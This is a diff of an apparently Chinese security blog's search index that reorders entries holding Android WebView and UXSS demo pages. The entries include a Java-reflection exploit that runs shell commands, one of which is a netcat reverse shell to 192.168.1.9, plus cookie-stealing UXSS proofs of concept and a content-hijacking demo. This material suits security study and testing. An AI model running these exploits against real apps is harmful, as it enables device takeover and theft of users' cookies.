@@ -1080,7 +1080,7 @@
   <entry>
     <title><![CDATA[友情链接]]></title>
     <url>%2Ffriends%2Findex.html</url>
-    <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna Patrilic’s Blog TonghuaRoot’s BloG. hihi007’s Blog]]></content>
+    <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna Patrilic’s Blog TonghuaRoot’s BloG. hihi007’s Blog 倾旋的博客 Ceil Profile]]></content>
   </entry>
   <entry>
     <title><![CDATA[search]]></title>
@@ -1099,18 +1099,13 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebview.html</url>
-    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>%2Ftools%2Fweibo.html</url>
     <content type="text"><![CDATA[weibo test console.log('init...'); window.__fla_ready = function() { console.log('loading...'); fla.Load('http://www.weibo.com/messages?topnav=1#'); }; window.__fla_complete = function(data) { document.write(data); console.info('recv:\n%s', data); };]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2FflashCSRF%2FContentHijacking.html</url>
-    <content type="text"><![CDATA[Cross Site Content Hijacking Demo! html, body { height: 100%; overflow: auto; } body { padding: 0; margin: 0; } table { /* table-layout: fixed;*/ border-collapse: collapse; border-spacing: 0; width: 100%; } th { font-family: verdana; color: white; vertical-align: middle; background-color: black; } td { font-family: verdana; word-wrap:break-word; height: 30px; max-width: 600px; } #silverlightControlHost { height: 100%; text-align:center; } .info { background: #ffff00; } .logdata:nth-last-child(2n-1) { background: #ccc; } .logdata { white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; overflow:auto; max-height: 300px; } .note { font-family: courier; font-size: 15px; } //PDF related var isPDFLoaded = 0; function createMessageHandler(objPDF) { if(objPDF != null){ objPDF.messageHandler = { onMessage: function(msg) { try{ if(msg[0]=='loaded' && msg[1]=='1'){ // The created PDF files sends the load message continuously for 5 seconds to make sure HTML is ready... if(isPDFLoaded===1) return; isPDFLoaded = 1; pdfLoaded(); }else{ javaScriptLogData(msg[0]); } }catch(e){ } }, onError: function(error, msg) { alert(error.message); } } } } var objPDFCheckInterval; var objPDFCheckIntervalCounter = 0; // This function is called from JavaScript via setTimeout. function pdfLoaded() { objPDFCheckIntervalCounter++; var objPDF = document.getElementById('myObject'); if(isPDFLoaded===1){ clearTimeout(objPDFCheckInterval); javaScriptLogData("PDF object has been loaded successfuly."); callTheObj(); }else if(objPDFCheckIntervalCounter]]></content>
+    <url>%2Ftools%2Fwebview.html</url>
+    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1119,8 +1114,8 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
-    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+    <url>%2Ftools%2FflashCSRF%2FContentHijacking.html</url>
+    <content type="text"><![CDATA[Cross Site Content Hijacking Demo! html, body { height: 100%; overflow: auto; } body { padding: 0; margin: 0; } table { /* table-layout: fixed;*/ border-collapse: collapse; border-spacing: 0; width: 100%; } th { font-family: verdana; color: white; vertical-align: middle; background-color: black; } td { font-family: verdana; word-wrap:break-word; height: 30px; max-width: 600px; } #silverlightControlHost { height: 100%; text-align:center; } .info { background: #ffff00; } .logdata:nth-last-child(2n-1) { background: #ccc; } .logdata { white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; overflow:auto; max-height: 300px; } .note { font-family: courier; font-size: 15px; } //PDF related var isPDFLoaded = 0; function createMessageHandler(objPDF) { if(objPDF != null){ objPDF.messageHandler = { onMessage: function(msg) { try{ if(msg[0]=='loaded' && msg[1]=='1'){ // The created PDF files sends the load message continuously for 5 seconds to make sure HTML is ready... if(isPDFLoaded===1) return; isPDFLoaded = 1; pdfLoaded(); }else{ javaScriptLogData(msg[0]); } }catch(e){ } }, onError: function(error, msg) { alert(error.message); } } } } var objPDFCheckInterval; var objPDFCheckIntervalCounter = 0; // This function is called from JavaScript via setTimeout. function pdfLoaded() { objPDFCheckIntervalCounter++; var objPDF = document.getElementById('myObject'); if(isPDFLoaded===1){ clearTimeout(objPDFCheckInterval); javaScriptLogData("PDF object has been loaded successfuly."); callTheObj(); }else if(objPDFCheckIntervalCounter]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1129,17 +1124,22 @@
   </entry>
   <entry>
     <title></title>
+    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
+    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
     <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
+    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
+    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
   </entry>
 </search>
